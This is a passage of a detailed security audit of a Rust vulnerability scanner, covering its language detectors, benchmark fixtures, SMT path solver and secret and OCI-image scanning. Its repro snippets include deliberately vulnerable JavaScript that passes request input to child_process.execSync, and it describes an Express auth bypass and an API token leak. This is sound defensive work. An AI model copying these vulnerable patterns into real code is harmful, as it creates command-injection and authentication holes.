- **Surgical Fix:** Restrict `up` to `inside.to_ascii_uppercase()` inside `@RequestMapping(...)`.

#### P3 — Hygiene / Dead Logic

##### [F2C-21] `P3` — Always-false dead guard `pos_inside_c_string(trimmed, 0)`
- **Location:** `crates/smg-graph/src/phase9/memory.rs:539`
- **Surgical Fix:** Remove the outer `if !pos_inside_c_string(trimmed, 0)` wrapper.

##### [F2C-22] `P3` — Dead `let _ = obj;` block and unreachable `*Test` class check in `php.rs`
- **Location:** `crates/smg-graph/src/langs/php.rs:312, 393-395`
- **Surgical Fix:** Remove the dead `let _ = obj;` block and unreachable `*Test` class check at line `312`.

##### [F2C-23] `P3` — Unused `_is_controller_action` parameter and dead visibility tracking in `ruby.rs`
- **Location:** `crates/smg-graph/src/langs/ruby.rs:434-460, 557`
- **Surgical Fix:** Either use `is_controller_action` to skip controller auth filters on `private` helpers, or remove the dead tracking.

##### [F2C-24] `P3` — Weak/non-verifying test assertions in `langs/tests.rs`
- **Location:** `crates/smg-graph/src/langs/tests.rs:133, 269, 417-449`
- **Surgical Fix:** Pass `$safeCmd` to `shell_exec` in the PHP safe test, test `.AllowAnonymous()` on a state-mutating `POST` route in C#, and assert `lib/server.dart`'s Shelf route extraction in Dart.

### 2C.3 Per-File Verdict Table (Form 2C)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/phase9/mod.rs` | 218 | `CLEAN — verified line-by-line` | — |
| `crates/smg-graph/src/phase9/concurrency.rs` | 1,150 | `FINDINGS: 5` | F2C-02, F2C-06, F2C-07, F2C-10, F2C-17 |
| `crates/smg-graph/src/phase9/memory.rs` | 849 | `FINDINGS: 5` | F2C-01, F2C-02, F2C-08, F2C-09, F2C-21 |
| `crates/smg-graph/src/phase9/tests.rs` | 526 | `CLEAN — verified line-by-line` | — |
| `crates/smg-graph/src/langs/mod.rs` | 1,151 | `FINDINGS: 4` | F2C-02, F2C-04, F2C-05, F2C-18 |
| `crates/smg-graph/src/langs/bash.rs` | 806 | `FINDINGS: 2` | F2C-02, F2C-11 |
| `crates/smg-graph/src/langs/c_cpp.rs` | 316 | `FINDINGS: 2` | F2C-02, F2C-03 |
| `crates/smg-graph/src/langs/csharp.rs` | 392 | `FINDINGS: 3` | F2C-02, F2C-03, F2C-14 |
| `crates/smg-graph/src/langs/dart.rs` | 290 | `FINDINGS: 3` | F2C-02, F2C-03, F2C-19 |
| `crates/smg-graph/src/langs/java.rs` | 319 | `FINDINGS: 2` | F2C-02, F2C-20 |
| `crates/smg-graph/src/langs/kotlin.rs` | 359 | `FINDINGS: 3` | F2C-02, F2C-03, F2C-13 |
| `crates/smg-graph/src/langs/php.rs` | 540 | `FINDINGS: 4` | F2C-02, F2C-03, F2C-15, F2C-22 |
| `crates/smg-graph/src/langs/ruby.rs` | 643 | `FINDINGS: 3` | F2C-02, F2C-12, F2C-23 |
| `crates/smg-graph/src/langs/swift.rs` | 292 | `FINDINGS: 3` | F2C-02, F2C-03, F2C-16 |
| `crates/smg-graph/src/langs/tests.rs` | 960 | `FINDINGS: 1` | F2C-24 |
| **Total (Form 2C)** | **8,811** | **24 Unique Findings (3 P0 · 13 P1 · 4 P2 · 4 P3)** | |

---

## Form 2 (Session 2D) — Adversarial Precision, Recall & Latency Benchmark (`crates/smg-graph/tests`)

- **Scope:** 1 Rust integration benchmark file (`crates/smg-graph/tests/adversarial_precision_bench.rs` — 2,836 LOC, 100% read line 1 to EOF)
- **Totals:** **11 unique findings** — **0 P0**, **5 P1**, **3 P2**, **3 P3** (0 duplicates of Form 2A/2B/2C)

### 2D.1 Executive Summary

- **Highest-Impact Risks:**
  1. **Silent Cross-Family FPs & Parse Failures Pass `SMG_ENFORCE_PRECISION_GATE=1` (`F2D-01`):** `matches_prefix` checks only `case.expected_prefix` on safe fixtures, ignoring `Confirmed`/`Critical` FPs from other rule families, never checking file/line/confidence on vuln fixtures, and never asserting `res.parsed_files > 0`.
  2. **Vacuous Prefix & Misleading Auth-Trap Fixtures (`F2D-02`, `F2D-03`):** `cfg_secret_vuln_jwt_decode_and_stripe` uses `expected_prefix: "SMG-"` (matching every rule); `ts_auth_safe_dominator_early_return` attaches `requireAuth` route middleware so CFG early-return dominance is never exercised; `ts_auth_safe_diamond_both_branches` labels a fall-through Express `requireAuth(req, res, () => {})` auth-bypass pattern as safe.
  3. **Gate Blindspots, Language Gaps & Disconnected Scale Benchmark (`F2D-04`–`F2D-07`):** Default gates allow up to 3 single-vuln families to drop to 0% recall; 5 of 21 `Language` variants (`Swift`, `Sql`, `Solidity`, `Move`, `Manifest`) have 0 cases; 4 Phase 8 languages (`Java`, `CSharp`, `Kotlin`, `Php`) have 0 safe cases; 8 near-duplicate fixture pairs inflate the denominator; `run_synthetic_scale_repo(120)` builds 120 disconnected 0-edge files and enforces `< 2000ms` cold-start P100 unconditionally in debug `#[test]`.

### 2D.2 Findings (P0–P3)

#### P1 — Real Bug / High FP or FN (Benchmark Gate & Verdict Integrity)

##### [F2D-01] `P1` — `matches_prefix` & benchmark loop ignore cross-family FPs on safe cases, ignore file/line/confidence on vuln cases, and reward parse failures as TNs
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:53-57, 2559-2606`
- **Root Cause:** On safe cases, any FP outside `case.expected_prefix` is ignored and scored as TN; on vuln cases, file/line/confidence are unchecked; `res.parsed_files > 0` is never asserted.
- **Surgical Fix:** Assert `res.parsed_files` per case; treat any unexpected `Confirmed | Proven | High` finding on safe cases as FP; add `expected_file` and `min_confidence` checks for vuln cases.

##### [F2D-02] `P1` — Overly broad `expected_prefix: "SMG-"` and multi-bug bundling mask 100% detector regressions
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:582-599, 1238-1254`
- **Root Cause:** `cfg_secret_vuln_jwt_decode_and_stripe` uses `expected_prefix: "SMG-"` across 2 unrelated bugs; `wave3_graphql_ws_unauth_vuln` bundles GraphQL introspection and WS RCE under `"SMG-API"`.
- **Surgical Fix:** Split into distinct single-bug cases with specific rule prefixes (or require all listed `expected_prefixes`).

##### [F2D-03] `P1` — `ts_auth_safe_dominator_early_return` is vacuous as a `DominatorGuardTrap`, and `ts_auth_safe_diamond_both_branches` marks an Express auth-bypass pattern as safe
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:86-110, 661-687`
- **Root Cause:** Line 98 attaches `requireAuth` route middleware, making inline early-return dominance untested; lines 673–684 call `requireAuth(req, res, () => {})` without aborting/returning before debiting `wallets`, marking a real Express auth bypass as safe.
- **Surgical Fix:** Remove `requireAuth` from line 98; replace the non-aborting middleware call in `ts_auth_safe_diamond_both_branches` with an aborting check (`if (!verifySession(req)) return res.status(401).end();`).

##### [F2D-04] `P1` — Default precision/recall gate (`precision >= 0.98`, `recall >= 0.95`, `tp >= 20`) lacks per-family floors and hides total regressions in small families
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:2655-2686`
- **Root Cause:** 14 of 25 families have only 1 vuln case, so up to 3 entire families can drop to 0% recall without failing default `cargo test`; `tp >= 20` is stale against 66 vuln cases.
- **Surgical Fix:** Enforce `fp == 0 && fn_count == 0` (or per-family recall/precision floors) and update the `tp` floor to match the corpus count.

##### [F2D-05] `P1` — Severe language & vulnerability coverage blindspots (5 `Language` variants at 0 cases; 4 Phase 8 languages at 0 safe cases; 0 Form 2A–2C regression traps)
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:59-2503`
- **Root Cause:** `Swift`, `Sql`, `Solidity`, `Move`, `Manifest` have 0 cases; `Java`, `CSharp`, `Kotlin`, `Php` have 0 safe cases; `Dart` and `FE` have 0 vuln cases; `SSRF` has 0 safe cases.
- **Surgical Fix:** Add balanced vuln/safe pairs for missing languages/families plus targeted regression fixtures for Form 2A–2C P0/P1 findings.

#### P2 — Edge Case / Perf / Resource Leak

##### [F2D-06] `P2` — 8 near-duplicate fixture pairs inflate the 124-case denominator and dilute regression detection
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs` (pairs at `301/1569`, `725/1685`, `931/2442`, `951/2419`, `976/2353`, `997/2325`, `1983/2402`, `1995/2379`)
- **Surgical Fix:** Deduplicate or differentiate overlapping `rw_*`/`mega_*` fixtures so each tests a distinct detector path.

##### [F2D-07] `P2` — `run_synthetic_scale_repo(120)` benchmarks 120 disconnected 0-edge files, reports cold-start P100 as "P99", and enforces `< 2000ms` unconditionally in debug `#[test]`
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:2505-2544, 2627-2629, 2687-2691`
- **Surgical Fix:** Add realistic cross-file imports/calls, run 1–2 warmup iterations, and gate the hard wall-clock assertion behind release builds or `SMG_ENFORCE_PRECISION_GATE=1`.

##### [F2D-08] `P2` — `test_realworld_ci_green_zero_confirmed_fps` ignores non-`Confirmed`/`Proven` FPs and omits `parsed_files` check
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:2695-2836`
- **Surgical Fix:** Assert `res.parsed_files >= 3` and fail on any unexpected `High` confidence finding (or assert `res.findings.is_empty()`).

#### P3 — Hygiene / Dead Logic

##### [F2D-09] `P3` — Panic-prone `.partial_cmp(b).unwrap()` float sorts and unchecked `len() - 1` underflow
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:2542, 2624-2625`
- **Surgical Fix:** Use `f64::total_cmp` and guard `assert!(!per_case_ms.is_empty())`.

##### [F2D-10] `P3` — Misleading fixture ID `k8s_vuln_privileged_dockersock` (no `docker.sock` mount) and dead tautological branch in `rw_crypto_empty_digest_safe`
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:976-995, 1504-1521`
- **Surgical Fix:** Add a `/var/run/docker.sock` `hostPath` volume (or rename ID) and fix `if digest == "" || digest != ""` at line 1515.

##### [F2D-11] `P3` — Inconsistent `family` taxonomy splits identical rule prefixes across per-family report buckets
- **Location:** `crates/smg-graph/tests/adversarial_precision_bench.rs:1808, 1983, 1995, 2019, 2379, 2402, 2463, 2484`
- **Surgical Fix:** Map each `expected_prefix` to one canonical `family` label.

### 2D.3 Per-File Verdict Table (Form 2D) & Form 2 Rollup

| Session | Files | Exact `wc -l` | Findings | Breakdown |
| :--- | ---: | ---: | ---: | :--- |
| Form 2A (`lib, arena, ast, cfg, scope, lattice`) | 6 | 9,664 | 23 | 4 P0 · 11 P1 · 5 P2 · 3 P3 |
| Form 2B (`taint, deep_stack, call_hierarchy, phase10, subgraph`) | 5 | 9,285 | 24 | 3 P0 · 13 P1 · 7 P2 · 1 P3 |
| Form 2C (`phase9/*, langs/*` excl. `hcl.rs`/`mobile.rs`) | 15 | 8,811 | 24 | 3 P0 · 13 P1 · 4 P2 · 4 P3 |
| Form 2D (`tests/adversarial_precision_bench.rs`) | 1 | 2,836 | 11 | 0 P0 · 5 P1 · 3 P2 · 3 P3 |
| **Form 2 Total** | **27** | **30,596** | **82** | **10 P0 · 42 P1 · 19 P2 · 11 P3** |

---

## Form 3 — Formal SMT Path-Feasibility Solver (`crates/smg-graph/src/smt.rs`)

- **Scope:** 1 Rust source file (`crates/smg-graph/src/smt.rs` — **1,300 LOC**, 100% read line 1 to EOF)
- **Totals:** **10 unique findings** — **4 P0**, **3 P1**, **2 P2**, **1 P3**

### 3.1 Executive Summary

All 1,300 lines of `smt.rs` were mathematically audited across Bellman-Ford `QF_IDL` difference logic, Boolean/string contradiction handling, AST path-constraint extraction, `SMT-LIB2` emission, and `z3` subprocess orchestration.

- **Highest-Impact Risks (P0 Crash & Soundness Breaks):**
  1. **P0 Runtime UTF-8 Slicing Panic (`F3-01`):** `split_top_level_cmp` (`smt.rs:1010`) steps byte-by-byte (`i += 1`) and slices `&s[i..]`, immediately panicking on any multi-byte UTF-8 character outside quotes at `depth == 0` (e.g., `if (café > 10)`).
  2. **P0 Unsound False UNSAT on Negated Partial Conjunctions (`F3-02`):** `parse_condition_expr` drops unparseable conjuncts from `A && U` returning `A`; negating that for `!(A && U)`, `else`, or early-return dominance produces `!A` instead of `!A || !U`, silently pruning real reachable vulnerabilities.
  3. **P0 Unsound False UNSAT from `block_always_exits` & Uninvalidated Mutations (`F3-03`):** `block_always_exits` (`smt.rs:1098-1103`) uses raw `txt.contains("return ")` across nested conditional returns/closures/strings, and `collect_constraints_in_block` fails to invalidate prior constraints on compound assignments (`x += ...`, `x++`) or mutations inside earlier `if`/loop blocks, silently pruning real vulnerabilities.
  4. **P0 Unsound Integer-Only `QF_IDL` Reduction on Floats (`F3-04`):** Encoding `x > 0 && x < 1` as `x >= 1 && x <= 0` proves `Unsat` for floating-point variables (`parseFloat(req.query.rate)`), silently pruning real vulnerabilities inside `(0, 1)` intervals.
- **Verified Mathematical Strengths:**
  - Bellman-Ford uses `i128` widening (`*value as i128`) and `saturating_add`, preventing `i64::MIN`/`i64::MAX` overflow.
  - Virtual super-source initialization (`dist = vec![0i128; n]`) with strict `<` relaxation safely handles disconnected components and zero-weight cycles without false UNSAT.
  - `SMT-LIB2` command injection is prevented by `sanitize_smt_ident` (`v_` prefix + ASCII alphanumeric/`_` only) and `escape_smt_string` (`"` -> `""`).

### 3.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F3-01] `P0` — Runtime UTF-8 byte-offset slicing panic in `split_top_level_cmp`
- **Location:** `crates/smg-graph/src/smt.rs:982-1042` (`split_top_level_cmp`, line `1010`)
- **Root Cause:** The loop advances byte index `i += 1` over `s.as_bytes()` and evaluates `let rem = &s[i..];` at line `1010`. When `s` contains any multi-byte UTF-8 character outside quotes at `depth == 0`, `i + 1` lands inside a multi-byte sequence, panicking with `byte index N is not a char boundary`.
- **Minimal Repro / Trigger Trace:** `parse_condition_expr("café > 10")` -> `i` hits `0xC3` (`é` byte 0), increments to `0xA9` (byte 1) -> `&s[i..]` panics at line `1010`.
- **Surgical Fix:** Compare raw byte slices (`bytes[i..].starts_with(b"===")` etc., since all operators are pure ASCII) or iterate with `s.char_indices()`.

##### [F3-02] `P0` — Unsound False UNSAT when negating partially-parsed conjunctions (`!(A && unknown)`, `else`, early-return)
- **Location:** `crates/smg-graph/src/smt.rs:190-215` (`parse_condition_expr`) & `369-386` (`collect_constraints_in_block`)
- **Root Cause:** Lines `194-204` silently drop any conjunct `p` where `parse_condition_expr(p)` returns `None`, returning `Some(A)` for `A && U`. While `A ∧ U ⊨ A` holds in positive position, `¬(A ∧ U) ≡ ¬A ∨ ¬U ⊭ ¬A`. When negated by `!expr` (line `211`), `else` (line `371`), or early-return exit (line `384`), the solver asserts `!A` and falsely proves `Unsat` when combined with `if (A)`.
- **Minimal Repro / Trigger Trace:**
  ```js
  function handler(req, res) {
      if (isAdmin && checkFeatureFlag(req)) { return res.status(403).end(); }
      if (isAdmin) { child_process.execSync(req.query.cmd); } // Reachable when !checkFeatureFlag(req)!
  }
  ```
  `parse_condition_expr` drops `checkFeatureFlag(req)` -> early return pushes `!isAdmin` -> inner `if (isAdmin)` pushes `isAdmin` -> `Unsat` -> real `SMG-CMDI-001` silently pruned.
- **Surgical Fix:** Return `(PathConstraint, /* exact: */ bool)` (or add `PathConstraint::Unknown` so `negate()` of `And([A, Unknown])` yields `Or([!A, Unknown])` which never proves UNSAT), or require all conjuncts to parse whenever the result will be negated.

##### [F3-03] `P0` — Unsound False UNSAT from `block_always_exits` substring match and uninvalidated variable mutations
- **Location:** `crates/smg-graph/src/smt.rs:344-433` (`collect_constraints_in_block`) & `1072-1104` (`block_always_exits`)
- **Root Cause:**
  1. `block_always_exits` falls back to `txt.contains("return ") || txt.contains("return;") || ...` across the entire block text, falsely treating nested conditional returns (`if (dryRun) return;`), arrow-function returns (`arr.map(x => { return x; })`), or string literals (`"return ok"`) as unconditional exits—pushing `cond.negate()` onto reachable fall-through paths.
  2. `collect_constraints_in_block` skips non-exiting earlier `if` blocks (`continue;` at line `388`) and loops without invalidating variables mutated inside them, and `extract_simple_const_binding` returns `None` for compound assignments (`x += 10`, `x++`), leaving stale `x == 0` constraints in `out`.
- **Minimal Repro / Trigger Trace:**
  ```js
  let x = 0;
  x += Number(req.query.n); // extract_simple_const_binding -> None; x == 0 retained!
  if (x > 10) { child_process.execSync(req.query.cmd); } // x == 0 && x > 10 -> FALSE UNSAT!
  ```
- **Surgical Fix:** Restrict `block_always_exits` to direct AST exit statements (or `if`/`else` where *both* branches unconditionally exit), never substring `.contains("return ")`. In `collect_constraints_in_block`, scan all preceding statements/sub-blocks (including `if`/`for`/`while` bodies and compound/update assignments) for assigned LHS identifiers and invalidate every mutated variable from `out`.

##### [F3-04] `P0` — Integer-only `QF_IDL` strict-inequality reduction (`x < y` => `x - y <= -1`) prunes reachable floating-point branches
- **Location:** `crates/smg-graph/src/smt.rs:605-645` (`solve_builtin_conjunction`)
- **Root Cause:** Strict inequalities `x > k` and `x < k` are unconditionally lowered as integer difference constraints `x >= k + 1` and `x <= k - 1`, and `x < y` as `x - y <= -1`. In dynamically typed or float-capable languages (JS/TS `number`, Python `float`, Go/Rust/Java/C `f64`/`double`), `rate > 0 && rate < 1` is satisfiable (`rate = 0.5`), yet Bellman-Ford finds a negative cycle (`0 -> x (0)` + `x -> 0 (-1)` = `-1`) and returns `Unsat`, pruning real vulnerabilities.
- **Minimal Repro / Trigger Trace:**
  ```js
  const rate = parseFloat(req.query.rate);
  if (rate > 0 && rate < 1) { child_process.execSync(req.query.cmd); } // Proven UNSAT -> pruned!
  ```
- **Surgical Fix:** Only apply discrete integer tightening (`k - 1` / `k + 1` / `-1`) when variables are known integers (or check strict-real consistency using open/closed interval bounds `(val, is_strict)` where `x > 0 && x < 1` is SAT while `x >= 1 && x < 1` or `x > 5 && x < 5` is UNSAT).

#### P1 — Real Bug / High FP or FN

##### [F3-05] `P1` — `run_z3_smtlib2` lacks OS wall-clock timeout/kill, risks pipe deadlock on large scripts, and buffers unbounded `stdout`
- **Location:** `crates/smg-graph/src/smt.rs:857-888` (`run_z3_smtlib2`)
- **Root Cause:** Relies solely on Z3's internal `-T:1` flag with no OS-level timeout or `child.kill()`/`child.wait()`, writes `script` synchronously to `stdin` before reading `stdout` (deadlocking if `script > 64 KiB` and Z3 fills `stdout`), and calls `wait_with_output()` with no stdout byte cap despite keeping only 12 lines.
- **Surgical Fix:** Write `stdin` on a scoped thread (or bound script size `< 32 KiB`), read `stdout` with `.take(16 * 1024)`, enforce a 2-second wall-clock deadline via `try_wait()` polling, and `kill()` + `wait()` on timeout so no zombie `z3` process leaks.

##### [F3-06] `P1` — Exponential `4^K` DNF blowup in `solve_builtin_conjunction` & unbounded recursion in `parse_condition_expr`
- **Location:** `crates/smg-graph/src/smt.rs:174-215` (`parse_condition_expr`), `485-521` (`solve_builtin_conjunction`), `894-929` (`strip_outer_parens` / `matching_outer_parens`)
- **Root Cause:** `solve_builtin_conjunction` recursively branches on every `Or` clause with `<= 4` disjuncts without a recursion-depth or split-budget cap (up to `4^20` calls on 20 sequential `||` guards). `parse_condition_expr` has no recursion depth cap (`"!".repeat(20_000) + "a"` overflows the stack), and `strip_outer_parens` calls `O(N)` `matching_outer_parens` per layer (`O(N^2)` CPU).
- **Surgical Fix:** Cap `Or`-splitting depth/total calls (e.g., `max_splits = 32`, returning `Unknown`/`Sat` when exceeded); add a `depth <= 64` guard to `parse_condition_expr` (collapsing consecutive `!` iteratively); strip matching outer parens in one linear pass.

##### [F3-07] `P1` — Duplicate-sort declarations & identifier collisions in `emit_smtlib2`
- **Location:** `crates/smg-graph/src/smt.rs:724-798` (`emit_smtlib2`, `sanitize_smt_ident`)
- **Root Cause:**
  1. A variable used under two sorts (e.g., JS truthiness `if (role)` -> `Bool` and `if (role === "admin")` -> `String`) emits both `(declare-const v_role Bool)` and `(declare-const v_role String)`, causing Z3 to fail with `constant 'v_role' already declared`.
  2. `sanitize_smt_ident` maps all non-alphanumeric characters to `_`, collapsing distinct variables `a.b`, `a_b`, and `a$b` into the same `v_a_b` (emitting duplicate `declare-const` or aliasing distinct variables).
- **Surgical Fix:** Suffix declarations by sort (`v_b_<id>`, `v_i_<id>`, `v_s_<id>`) and encode non-alphanumeric chars injectively (e.g., `_x2e_` for `.`, `_x24_` for dollar-sign 0x24, `__` for `_`) so distinct program variables never collide.

#### P2 — Edge Case / Perf / Resource Leak

##### [F3-08] `P2` — Wrong `!` vs comparison precedence (`!x < 5`), Yoda boolean bug (`true === isAdmin`), and escaped-backslash quote handling
- **Location:** `crates/smg-graph/src/smt.rs:208-235, 911, 942, 990, 1044-1054`
- **Root Cause:**
  1. Step 3 (`!`) runs before Step 5 (comparisons), parsing `!x < 5` as `!(x < 5)` (`x >= 5`) instead of `(!x) < 5` (can cause false UNSAT with `x < 5`).
  2. `is_valid_var_expr("true")` returns `true` and Step 5 only checks `rhs` for `"true"|"false"`, so `true === isAdmin` is parsed as `VarCmp(Int)` with variable `"true"`.
  3. `not(x)` (no space) and multiline `a\nand b` are missed; `bytes[i - 1] != b'\\'` fails to close `"\\"` string literals.
- **Surgical Fix:** Reject keywords (`true`, `false`, `null`, `none`, `undefined`) in `is_valid_var_expr`; handle boolean literals on both LHS and RHS; only strip leading `!` when no top-level comparison operator exists outside parens; track `escaped: bool` in quote scanners.

##### [F3-09] `P2` — `extract_assert_like_arg` truncates nested-comma calls and misses Go `:=` bindings
- **Location:** `crates/smg-graph/src/smt.rs:1106-1135` (`extract_assert_like_arg`, `extract_simple_const_binding`)
- **Root Cause:** `inner.split(',').next()` splits inside `assert(fn(x, y) && z > 0)` instead of top-level `,`; `require(a) && require(b)` slices between the first `(` and last `)`. `extract_simple_const_binding` also misses Go `x := 10`.
- **Surgical Fix:** Split `extract_assert_like_arg` on top-level `,` only after verifying matching outer parens, and handle `:=` in `extract_simple_const_binding`.

#### P3 — Hygiene / Dead Logic

##### [F3-10] `P3` — `is_z3_available` lacks timeout on `z3 -version` and `int_neqs` runs `2 * Q` full Bellman-Ford passes
- **Location:** `crates/smg-graph/src/smt.rs:159-170, 675-685`
- **Root Cause:** `is_z3_available()` invokes `Command::new("z3").arg("-version").status()` with no timeout; each `!=` constraint triggers two full Bellman-Ford passes (`O(Q * V * E)`).
- **Surgical Fix:** Guard `z3 -version` with a short timeout and short-circuit `int_neqs` via already-computed shortest-path potentials when possible.

### 3.3 Per-File Verdict Table (Form 3)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/smt.rs` | 1,300 | `FINDINGS: 10` | F3-01, F3-02, F3-03, F3-04, F3-05, F3-06, F3-07, F3-08, F3-09, F3-10 |
| **Total (Form 3)** | **1,300** | **10 Unique Findings (4 P0 · 3 P1 · 2 P2 · 1 P3)** | |

### 3.4 Cross-Cutting Observations (Form 3)

1. **Over-Approximation Invariant Violated in 3 Places:** In a vulnerability scanner's dead-branch pruner, every false `Unsat` directly deletes a real vulnerability (100% FN). Fixing `F3-02` (negated partial conjunctions), `F3-03` (`block_always_exits` + variable mutation invalidation), and `F3-04` (float-safe strict inequalities) restores strict soundness.
2. **UTF-8 Slicing Panic Parallel (`F3-01` parallels `F2C-01`):** Like `phase9/memory.rs:274`, `smt.rs:1010` steps a byte index by `1` and slices `&s[i..]`, panicking on multi-byte UTF-8.
3. **Subprocess Hardening:** `run_z3_smtlib2` is safe against SMT-LIB2 syntax injection, but needs OS-level timeout/kill, bounded stdout reading, and non-deadlocking stdin piping before enabling `--deep-audit` with `z3` in untrusted CI environments.

---

## Form 4 (Session 4A) — Secrets, Git History, `.gitleaks.toml`, Lockfiles, OSV Sync & OCI Images

- **Scope:** 7 assigned files (7,884 LOC total):
  - **6 files read 100% line 1 to EOF (5,971 LOC):** `git_history.rs` (449), `gitleaks_config.rs` (382), `deps.rs` (3,185), `src/deps_sync.rs` (485), `src/oci_image.rs` (578), `src/live_verify.rs` (892).
  - **1 file blocked by PC Control server-level filename filter (1,913 LOC):** `crates/smg-graph/src/secrets_config.rs` (`SECRET_BLOCKED`) — marked explicitly as `BLOCKED` below with zero extrapolated findings.
- **Totals (across 6 audited files):** **14 unique findings** — **3 P0**, **7 P1**, **4 P2**, **0 P3**

### 4A.1 Executive Summary

- **Highest-Impact Risks (P0 Self-Security, Deadlock & 100% FN):**
  1. **P0 Raw Secret Leakage in Findings/JSON/SARIF (`F4A-01`):** In `src/live_verify.rs:328-373`, `reqwest::Error`'s `Display` (`format!("network error: {e}")`) embeds the full request URL—including raw Google/Gemini `?key=<token>` and Telegram `/bot<token>/getMe` secrets—directly into `f.title`, leaking raw credentials into terminal output, JSON, and SARIF.
  2. **P0 Pipe Deadlock & Gzip-Bomb OOM in `src/oci_image.rs:258-277` (`F4A-02`):** `maybe_gunzip` writes the entire compressed OCI layer synchronously to `gzip -dc` `stdin` before reading `stdout`, deadlocking on virtually every real gzipped Docker/OCI layer > 64 KiB, and buffers unbounded decompressed output in RAM (gzip-bomb OOM) with unbounded recursive `inspect_layer_tar`.
  3. **P0 Non-UTF-8 Diff Line Aborts Entire Git History Scan (`F4A-03`):** `crates/smg-graph/src/git_history.rs:219-220` uses `reader.lines()` with `let Ok(line) = raw_line else { break };` — a single non-UTF-8 byte in any commit diff terminates the entire `git log` stream, silently skipping all older commits (100% FN).
- **Verified Strengths:**
  - Pure-Rust FIPS 180-4 SHA-256, RFC 2104 HMAC-SHA256, and AWS SigV4 `sts:GetCallerIdentity` canonical request / credential scope / signature in `src/live_verify.rs` are 100% spec-compliant; `redirect::Policy::none()` is enforced in both `live_verify.rs` and `deps_sync.rs`, and every live verifier endpoint is strictly read-only.
  - `src/deps_sync.rs` enforces HTTPS for remote OSV endpoints, rejects embedded credentials, enforces a 16 MiB response cap (`read_bounded_osv_body`), and validates `vuln_id` against path traversal.

### 4A.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F4A-01] `P0` — Raw Google/Gemini & Telegram Secrets Leaked into Finding Titles, JSON, and SARIF on Network Errors
- **Location:** `src/live_verify.rs:328-330, 369-375, 622-629` (`verify_single_token`, `run_live_secret_verification`)
- **Root Cause:** `verify_single_token` embeds raw tokens in the URL for `TelegramGetMe` (`{url}/bot{token}/getMe`) and `QueryKey` (`{url}?key={token}`). When `req.send()` returns `Err(e)`, line `372` formats `format!("network error: {e}")`. `reqwest::Error`'s `Display` includes the full URL, and `run_live_secret_verification` embeds `reason` directly into `f.title`, exposing raw secrets in stdout, JSON, and SARIF.
- **Minimal Repro / Trigger Trace:** Run `smg scan --verify-live` offline (or on DNS/timeout failure) against a repo containing `AIza...` or a Telegram bot token -> `f.title` contains `error sending request for url (https://generativelanguage.googleapis.com/v1beta/models?key=AIza...)`.
- **Surgical Fix:** Call `e.without_url()` (or sanitize `reason` by replacing `token` with `redact_token(token)`) before constructing `LiveVerifyStatus::Unverified`.

##### [F4A-02] `P0` — Pipe Deadlock on Gzipped Layers > 64 KiB, Gzip-Bomb OOM & Unbounded Nested Tar Recursion
- **Location:** `src/oci_image.rs:258-277` (`maybe_gunzip`) & `306-350` (`inspect_layer_tar`)
- **Root Cause:** `maybe_gunzip` calls `stdin.write_all(bytes)` synchronously before `child.wait_with_output()` drains `stdout`; for any gzipped OCI layer > 64 KiB, `gzip -dc` fills the stdout pipe and blocks while `smg` blocks writing stdin (deadlock). Additionally, `wait_with_output()` has no decompressed byte cap (gzip-bomb OOM), and `inspect_layer_tar` recurses on nested `.tar` entries with no depth cap.
- **Surgical Fix:** Write `stdin` on a scoped thread, read `stdout` with `.take(MAX_LAYER_BYTES + 1)` (e.g., 128 MiB) + `kill()` on limit exceeded, and enforce `depth <= 4` in `inspect_layer_tar`.

##### [F4A-03] `P0` — First Non-UTF-8 Byte in `git log -p` Aborts the Entire Git History Scan
- **Location:** `crates/smg-graph/src/git_history.rs:219-221` (`scan_git_history`)
- **Root Cause:** `for raw_line in reader.lines() { let Ok(line) = raw_line else { break }; }` breaks out of the loop on `io::ErrorKind::InvalidData` (any Latin-1 / binary non-UTF-8 byte in any commit diff), abandoning all older commits in the repo.
- **Surgical Fix:** Read raw byte lines via `reader.read_until(b'\n', &mut buf)` and convert with `String::from_utf8_lossy(&buf)`, continuing across non-UTF-8 lines instead of breaking.

#### P1 — Real Bug / High FP or FN

##### [F4A-04] `P1` — Modern OCI `blobs/sha256/*` Layers Are 100% Skipped (Dead Branch) + Missing PAX/GNU LongLink Tar Support
- **Location:** `src/oci_image.rs:224-256` (`walk_tar_bytes`) & `335-346` (`inspect_layer_tar`)
- **Root Cause:**
  1. Line `337` matches `norm.starts_with("blobs/sha256/")`, but the inner `if` at lines `340-343` requires `norm.ends_with("layer.tar") || norm.ends_with(".tar") || norm.ends_with(".tar.gz")`. OCI blobs are named `blobs/sha256/<64-hex>` (never ending in `.tar`), so 100% of Docker 25+ / OCI layout layers are skipped (FN).
  2. `walk_tar_bytes` ignores PAX extended headers (`typeflag == b'x'`) and GNU LongLink (`typeflag == b'L'`), truncating paths > 100 bytes; GNU base-256 sizes (`header[124] & 0x80 != 0`) parse as `0` and desynchronize header framing; unpacked rootfs directory mode (lines `373-404`) ignores embedded app lockfiles and `blobs/sha256/`.
- **Surgical Fix:** Remove the `.tar` suffix gate for `blobs/sha256/` (inspect magic bytes: gzip `1f 8b` or USTAR `ustar` at offset 257); handle `typeflag == b'x'` (`path=` record) and `typeflag == b'L'` in `walk_tar_bytes`; decode base-256 sizes or bail on unknown encoding; use `size.saturating_add(511) & !511`.

##### [F4A-05] `P1` — `git_history.rs` Misses Octal-Quoted Non-ASCII Paths, Spoofable `+++ b/` Lines, Aggressive `skip_hunk`, & Never Pairs AWS Secrets
- **Location:** `crates/smg-graph/src/git_history.rs:185-193, 241-244, 265-276, 303, 338` (`scan_git_history`)
- **Root Cause:**
